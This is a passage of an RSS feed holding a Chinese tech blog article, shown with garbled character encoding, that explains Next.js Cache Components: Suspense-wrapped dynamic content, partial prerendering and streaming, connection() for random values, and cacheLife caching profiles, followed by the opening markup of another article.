                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{item.id}</span>&gt;</span>{item.name} - {item.age}<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                ))}
            <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    )
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f95aabdf399e4a2d95c79ed6f10f6f33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5ruhenM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766312592&amp;x-signature=RnQ7Mi0mGCLUMhn9%2BqvzEcigj2I%3D" alt="image.png" loading="lazy"/></p>
<h5 data-id="heading-4">2.1 åŠ¨æ€å†…å®¹å±•ç¤º</h5>
<p>é€‚ç”¨åœºæ™¯ï¼šfetchè¯·æ±‚ã€cookiesã€headersç­‰åŠ¨æ€æ•°æ®</p>
<blockquote>
<p>åŠ¨æ€å†…å®¹å¿…é¡»é…åˆSuspenseä½¿ç”¨ã€‚</p>
</blockquote>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Suspense</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>
<span class="hljs-keyword">import</span> { cookies } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/headers"</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">DynamicContent</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://www.mocklib.com/mock/random/name'</span>) <span class="hljs-comment">//éšæœºç”Ÿæˆä¸€ä¸ªåç§°</span>
    <span class="hljs-keyword">const</span> json = <span class="hljs-keyword">await</span> data.<span class="hljs-title function_">json</span>()
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(json)
    <span class="hljs-keyword">const</span> cookieStore = <span class="hljs-keyword">await</span> <span class="hljs-title function_">cookies</span>() <span class="hljs-comment">//è·å–cookie</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cookieStore)
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>åŠ¨æ€å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>åç§°ï¼š{json.name}<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    )
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>åŠ¨æ€å†…å®¹Loading...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}&gt;
                <span class="hljs-tag">&lt;<span class="hljs-name">DynamicContent</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    )
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/676b89ba6c6d42d6ab7c9a92394cc9ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5ruhenM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766312592&amp;x-signature=Kxp5U%2BwHvBNPLJuel8WBCsP8NWU%3D" alt="image.png" loading="lazy"/></p>
<h5 data-id="heading-5">2.2 å®ç°åŸç†</h5>
<p>Next.js ä¼šé€šè¿‡<code>(Partial Prerendering/PPR)</code>æŠ€æœ¯,å®ç°é™æ€å¤–å£³(Static Shell)æ¸²æŸ“ï¼Œæä¾›å ä½ç¬¦ï¼Œå½“ç”¨æˆ·è¯·æ±‚æ—¶ï¼Œå†é€šè¿‡æµå¼ä¼ è¾“(Streaming)å¡«å……é‡Œé¢çš„åŠ¨æ€å†…å®¹ï¼Œä»¥æ­¤æå‡é¦–å±åŠ è½½é€Ÿåº¦å’Œç”¨æˆ·ä½“éªŒã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adc6b9ee874949d8a9d0f691ec8706ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5ruhenM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766312592&amp;x-signature=A1zRfCxECpKB8uaQy3lxpmtTirA%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘ä»¬è§‚å¯Ÿä¸Šå›¾</p>
<ul>
<li>
<p><code>&lt;h1&gt;Home&lt;/h1&gt;</code>ï¼š çº¯é™æ€å†…å®¹ï¼Œå±äºé™æ€å¤–å£³çš„ä¸€éƒ¨åˆ†ï¼Œæ„å»º / è¯·æ±‚æ—¶ç›´æ¥æ¸²æŸ“ï¼Œæµè§ˆå™¨èƒ½ç«‹å³æ˜¾ç¤ºã€‚</p>
</li>
<li>
<p><code>&lt;template id="B:0"&gt;&lt;/template&gt;</code> åŠ¨æ€å†…å®¹çš„å®¹å™¨æ¨¡æ¿ï¼Œåç»­ç”¨æ¥æŒ‚è½½å¼‚æ­¥åŠ è½½çš„åŠ¨æ€å†…å®¹</p>
</li>
<li>
<p><code>&lt;div&gt;åŠ¨æ€å†…å®¹Loading...&lt;/div&gt;</code>ï¼šå ä½ç¬¦ï¼ˆfallbackï¼‰ï¼Œå±äºé™æ€å¤–å£³çš„ä¸€éƒ¨åˆ†ï¼Œåœ¨åŠ¨æ€å†…å®¹åŠ è½½å®Œæˆå‰æ˜¾ç¤ºã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/030007fe15934d0f83f932a99648ac2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5ruhenM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766312592&amp;x-signature=nGnY%2FrvETk%2BlJalRcMgijMwztQs%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>
<p>è¿™ä¸ª <code>&lt;div&gt;</code> åˆå§‹ä¸º hiddenï¼Œæ˜¯æœåŠ¡å™¨å¼‚æ­¥æ¸²æŸ“å®Œæˆçš„åŠ¨æ€å†…å®¹ï¼Œç­‰å¾…å®¢æˆ·ç«¯è„šæœ¬è§¦å‘åæ›¿æ¢åˆ°å ä½ç¬¦ä½ç½®ã€‚</p>
</li>
<li>
<p>id="S:0" ä¸å‰é¢çš„ <code>&lt;template id="B:0"&gt;</code> ä¸€ä¸€å¯¹åº”ï¼Œæ˜¯ â€œåŠ¨æ€å†…å®¹ - å ä½ç¬¦â€ çš„å…³è”æ ‡è¯†ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/704fcb36a784467f820198b31d07b674~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5ruhenM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766312592&amp;x-signature=1NjqnpghA8GewBhv6z99wmixCoE%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-ts" lang="ts">$RC(<span class="hljs-string">"B:0"</span>, <span class="hljs-string">"S:0"</span>) <span class="hljs-comment">// å…³é”®è°ƒç”¨ï¼šå…³è” B:0 å ä½ç¬¦å’Œ S:0 åŠ¨æ€å†…å®¹</span>
</code></pre>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>C</mi><mtext>ï¼ˆ</mtext><mi>R</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>t</mi><mi>C</mi><mi>o</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>R</mi><mi>e</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>e</mi><mtext>ï¼‰ï¼šæ‰¾åˆ°</mtext><mi>i</mi><mi>d</mi><mo>=</mo><mi mathvariant="normal">"</mi><mi>B</mi><mo>:</mo><mn>0</mn><mi mathvariant="normal">"</mi><mtext>çš„å ä½ç¬¦å’Œ</mtext><mi>i</mi><mi>d</mi><mo>=</mo><mi mathvariant="normal">"</mi><mi>S</mi><mo>:</mo><mn>0</mn><mi mathvariant="normal">"</mi><mtext>çš„åŠ¨æ€å†…å®¹ï¼Œå°†å…¶åŠ å…¥æ›¿æ¢é˜Ÿåˆ—</mtext></mrow><annotation encoding="application/x-tex">RCï¼ˆReact Content Replaceï¼‰ï¼šæ‰¾åˆ° id="B:0" çš„å ä½ç¬¦å’Œ id="S:0" çš„åŠ¨æ€å†…å®¹ï¼Œå°†å…¶åŠ å…¥æ›¿æ¢é˜Ÿåˆ— </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">RC</span><span class="mord cjk_fallback">ï¼ˆ</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.07153em;">tC</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.00773em;">tR</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">pl</span><span class="mord mathnormal">a</span><span class="mord mathnormal">ce</span><span class="mord cjk_fallback">ï¼‰ï¼šæ‰¾åˆ°</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">"</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">0"</span><span class="mord cjk_fallback">çš„å ä½ç¬¦å’Œ</span><span class="mord mathnormal">i</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">"</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">0"</span><span class="mord cjk_fallback">çš„åŠ¨æ€å†…å®¹ï¼Œå°†å…¶åŠ å…¥æ›¿æ¢é˜Ÿåˆ—</span></span></span></span></span>RBã€‚</li>
<li>$RVï¼ˆReact Content Renderï¼‰ï¼šåœ¨åŠ¨ç”»å¸§ / è¶…æ—¶åæ‰§è¡Œæ›¿æ¢ï¼Œç§»é™¤åŠ è½½å ä½ç¬¦ï¼Œå°†åŠ¨æ€å†…å®¹æ’å…¥åˆ°é¡µé¢ä¸­ï¼Œå®Œæˆæœ€ç»ˆæ¸²æŸ“ã€‚</li>
</ul>
<h5 data-id="heading-6">2.3 éç¡®å®šæ“ä½œ</h5>
<p>ä¾‹å¦‚: <code>éšæœºæ•°</code>ã€<code>æ—¶é—´æˆ³</code>ç­‰éç¡®å®šæ“ä½œï¼Œæ¯æ¬¡è¯·æ±‚éƒ½å¯èƒ½ç”Ÿæˆä¸åŒç»“æœã€‚</p>
<p>ç›´æ¥ä½¿ç”¨å°±ä¼šæŠ¥é”™å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>Error: Route "/home" used <code>Math.random()</code> before accessing either uncached data (e.g. <code>fetch()</code>) or Request data (e.g. <code>cookies()</code>, <code>headers()</code>, <code>connection()</code>, and <code>searchParams</code>). Accessing random values synchronously in a Server Component requires reading one of these data sources first. Alternatively, consider moving this expression into a Client Component or Cache Component. See more info here: <a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fdocs%2Fmessages%2Fnext-prerender-random" target="_blank" title="https://nextjs.org/docs/messages/next-prerender-random" ref="nofollow noopener noreferrer">nextjs.org/docs/messagâ€¦</a>
at DynamicContent (page.tsx:5:25)
at Home (page.tsx:27:17)</p>
</blockquote>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<p>ä½¿ç”¨SuspenseåŒ…è£¹ï¼Œç„¶åä½¿ç”¨connectionè¡¨ç¤ºä¸è¦é¢„æ¸²æŸ“è¿™éƒ¨åˆ†ã€‚</p>
<p>Next.jsé»˜è®¤ä¼šå°è¯•å°½å¯èƒ½å¤šåœ°é™æ€é¢„æ¸²æŸ“é¡µé¢å†…å®¹ã€‚ä½†åƒ <code>Math.random()</code> è¿™æ ·çš„å€¼æ¯æ¬¡è°ƒç”¨ç»“æœéƒ½ä¸åŒï¼Œå¦‚æœåœ¨é¢„æ¸²æŸ“æ—¶æ‰§è¡Œï¼Œé‚£è¿™ä¸ª"éšæœºå€¼"å°±è¢«å›ºå®šäº†ï¼Œå¤±å»äº†æ„ä¹‰ã€‚
é€šè¿‡åœ¨ Math.random() ä¹‹å‰è°ƒç”¨ await connection()ï¼Œä½ æ˜ç¡®å‘Šè¯‰ Next.jsï¼š</p>
<ul>
<li>ä¸è¦é¢„æ¸²æŸ“è¿™éƒ¨åˆ†</li>
<li>ç­‰çœŸæ­£æœ‰ç”¨æˆ·è¯·æ±‚æ—¶å†æ‰§è¡Œ</li>
</ul>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Suspense</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>
<span class="hljs-keyword">import</span> { connection } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">DynamicContent</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">connection</span>() <span class="hljs-comment">//ä½¿ç”¨connectionè¡¨ç¤ºä¸è¦é¢„æ¸²æŸ“è¿™éƒ¨åˆ†</span>
    <span class="hljs-keyword">const</span> random = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>()
    <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(random, now)
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>åŠ¨æ€å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>åç§°ï¼š{random}<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>æ—¶é—´ï¼š{now}<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    )
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>åŠ¨æ€å†…å®¹Loading...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}&gt;
                <span class="hljs-tag">&lt;<span class="hljs-name">DynamicContent</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    )
}
</code></pre>
<h5 data-id="heading-7">3. ç¼“å­˜å†…å®¹å±•ç¤º</h5>
<p>ç¼“å­˜ç»„ä»¶ï¼Œå¯ä»¥ä½¿ç”¨<code>use cache</code>å£°æ˜è¿™æ˜¯ä¸€ä¸ªç¼“å­˜ç»„ä»¶ï¼Œç„¶åä½¿ç”¨<code>cacheLife</code>å£°æ˜ç¼“å­˜æ—¶é—´ã€‚</p>
<p>cacheLifeå‚æ•°ï¼š</p>
<ul>
<li><code>stale</code>ï¼šå®¢æˆ·ç«¯åœ¨æ­¤æ—¶é—´å†…ç›´æ¥ä½¿ç”¨ç¼“å­˜ï¼Œä¸å‘æœåŠ¡å™¨å‘è¯·æ±‚<code>(å•ä½:ç§’)</code></li>
<li><code>revalidate</code>ï¼šè¶…è¿‡æ­¤æ—¶é—´åï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚æ—¶ä¼šåœ¨åå°é‡æ–°ç”Ÿæˆå†…å®¹<code>(å•ä½:ç§’)</code></li>
<li><code>expire</code>ï¼šè¶…è¿‡æ­¤æ—¶é—´æ— è®¿é—®ï¼Œç¼“å­˜å®Œå…¨å¤±æ•ˆï¼Œä¸‹æ¬¡è¯·æ±‚éœ€è¦ç­‰å¾…é‡æ–°è®¡ç®—<code>(å•ä½:ç§’)</code></li>
</ul>
<p>é¢„è®¾å‚æ•°:</p>






















































<table><thead><tr><th>Profile</th><th>é€‚ç”¨åœºæ™¯</th><th>stale</th><th>revalidate</th><th>expire</th></tr></thead><tbody><tr><td>seconds</td><td>å®æ—¶æ•°æ®ï¼ˆè‚¡ç¥¨ã€æ¯”åˆ†ï¼‰</td><td>30ç§’</td><td>1ç§’</td><td>1åˆ†é’Ÿ</td></tr><tr><td>minutes</td><td>é¢‘ç¹æ›´æ–°ï¼ˆç¤¾äº¤åŠ¨æ€ï¼‰</td><td>5åˆ†é’Ÿ</td><td>1åˆ†é’Ÿ</td><td>1å°æ—¶</td></tr><tr><td>hours</td><td>æ¯æ—¥å¤šæ¬¡æ›´æ–°ï¼ˆåº“å­˜ã€å¤©æ°”ï¼‰</td><td>5åˆ†é’Ÿ</td><td>1å°æ—¶</td><td>1å¤©</td></tr><tr><td>days</td><td>æ¯æ—¥æ›´æ–°ï¼ˆåšå®¢æ–‡ç« ï¼‰</td><td>5åˆ†é’Ÿ</td><td>1å¤©</td><td>1å‘¨</td></tr><tr><td>weeks</td><td>æ¯å‘¨æ›´æ–°ï¼ˆæ’­å®¢ï¼‰</td><td>5åˆ†é’Ÿ</td><td>1å‘¨</td><td>30å¤©</td></tr><tr><td>max</td><td>å¾ˆå°‘å˜åŒ–ï¼ˆæ³•å¾‹é¡µé¢ï¼‰</td><td>5åˆ†é’Ÿ</td><td>30å¤©</td><td>1å¹´</td></tr></tbody></table>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Suspense</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>
<span class="hljs-keyword">import</span> { cacheLife } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/cache"</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">DynamicContent</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-string">'use cache'</span>
    <span class="hljs-title function_">cacheLife</span>(<span class="hljs-string">"hours"</span>) <span class="hljs-comment">//ä½¿ç”¨é¢„è®¾å‚æ•°</span>
    <span class="hljs-comment">//cacheLife({stale: 30, revalidate: 1, expire: 1}) //ä½¿ç”¨è‡ªå®šä¹‰å‚æ•°</span>
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://www.mocklib.com/mock/random/name'</span>)
    <span class="hljs-keyword">const</span> json = <span class="hljs-keyword">await</span> data.<span class="hljs-title function_">json</span>()
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(json)
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>åŠ¨æ€å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>åç§°ï¼š{json.name}<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    )
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>åŠ¨æ€å†…å®¹Loading...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}&gt;
                <span class="hljs-tag">&lt;<span class="hljs-name">DynamicContent</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    )
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3df9733f502044349a3b3b351098553e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5ruhenM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766312592&amp;x-signature=avUfm6e1smUSYWWY04XJHBq239Y%3D" alt="8.gif" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»é›¶åˆ°ä¸€ï¼šæ‰“é€ ä¸“ä¸šçº§å°è¯´åœ°å›¾è®¾è®¡å·¥å…·çš„æŠ€æœ¯å®è·µ]]></title>    <link>https://juejin.cn/post/7583158173978427402</link>    <guid>https://juejin.cn/post/7583158173978427402</guid>    <pubDate>2025-12-14T04:30:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583158173978427402" data-draft-id="7583174749066313774" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»é›¶åˆ°ä¸€ï¼šæ‰“é€ ä¸“ä¸šçº§å°è¯´åœ°å›¾è®¾è®¡å·¥å…·çš„æŠ€æœ¯å®è·µ"/> <meta itemprop="keywords" content="å‰ç«¯,Electron"/> <meta itemprop="datePublished" content="2025-12-14T04:30:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¾™å›½æµªå­"/> <meta itemprop="url" content="https://juejin.cn/user/1943592291275886"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»é›¶åˆ°ä¸€ï¼šæ‰“é€ ä¸“ä¸šçº§å°è¯´åœ°å›¾è®¾è®¡å·¥å…·çš„æŠ€æœ¯å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1943592291275886/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¾™å›½æµªå­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T04:30:47.000Z" title="Sun Dec 14 2025 04:30:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body 